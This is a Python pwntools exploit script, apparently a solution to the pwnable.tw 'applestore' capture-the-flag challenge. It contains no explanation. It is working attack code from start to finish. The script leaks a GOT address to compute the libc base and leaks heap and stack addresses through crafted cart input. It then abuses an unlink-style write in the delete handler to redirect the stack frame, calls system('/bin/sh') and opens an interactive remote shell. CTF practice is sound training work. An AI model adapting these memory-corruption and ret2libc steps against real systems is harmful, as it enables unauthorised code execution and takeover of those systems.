from pwn import *

locdbg=False

host='chall.pwnable.tw'
port=10104
filename='./applestore'
libcname='./libc_32.so.6'
elf=ELF(filename)

if locdbg:
    p=process('./applestore')
    libc=ELF('/usr/lib/i386-linux-gnu/libc-2.31.so')
    context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    context.log_level='debug'

def pwndbg():
    if locdbg:
        gdb.attach(p)

buyset=[6,20,0,0]

def add(devid):
    p.recvuntil('> ')
    p.send('2')
    sleep(0.3)
    p.recvuntil('Number> ')
    p.send(devid)
    sleep(0.3)

def delete(devid):
    p.recvuntil('> ')
    p.send('3')
    sleep(0.3)
    p.recvuntil('Number> ')
    p.send(devid)
    sleep(0.3)

def cart(yon):
    p.recvuntil('> ')
    p.send('4')
    sleep(0.3)
    p.recvuntil(') > ')
    p.send(yon)
    sleep(0.3)

def leak(addr,idx):
    cart(b'y\0'+p32(addr)+p32(233)+p32(0)+p32(0))
    p.recvuntil(str(idx)+': ')

for i in range(6):
    add('1')

for i in range(20):
    add('2')

p.recvuntil('> ')
p.send('5')
p.recvuntil(') > ')
p.send('y')

leak(elf.got['printf'],27)
libc_base=u32(p.recvuntil('$233')[0:4])-libc.symbols['printf']
print('libc-base='+hex(libc_base))
system_addr=libc_base+libc.symbols['system']
sh_addr=next(libc.search(b'/bin/sh'))+libc_base

for i in range(26):
    delete('1')

leak(0x0804b070,1)
ip8_addr=u32(p.recvuntil('$233')[0:4])
print('iphone 8 at: '+hex(ip8_addr))

#pwndbg()

leak(ip8_addr+0x20,1)
handler_ebp=u32(p.recvuntil('$233')[0:4])
print('h_ebp at: '+hex(handler_ebp))
#pwndbg()
delete(b'1\0'+p32(0)+p32(233)+p32(handler_ebp-0x20)+p32(handler_ebp-8))

p.recvuntil('> ')



p.send(b'6\0'+p32(handler_ebp)+p32(system_addr)+p32(0)+p32(sh_addr))
sleep(0.3)

p.interactive()
